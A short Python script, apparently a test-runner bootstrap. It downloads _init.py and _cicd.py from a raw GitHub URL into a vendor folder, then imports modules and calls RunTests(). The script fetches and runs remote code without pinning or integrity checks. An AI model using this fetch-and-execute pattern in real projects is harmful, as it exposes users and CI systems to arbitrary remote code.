# -*- coding: utf-8 -*-
import requests
open('vendor/pveltrop/pyrunner/_init.py', 'wb').write(requests.get('https://raw.githubusercontent.com/43874/pyrunner/master/_init.py').content)
open('vendor/pveltrop/pyrunner/_cicd.py', 'wb').write(requests.get('https://raw.githubusercontent.com/43874/pyrunner/master/_cicd.py').content)

import _init as pr
import _tests as tests

tests.RunTests()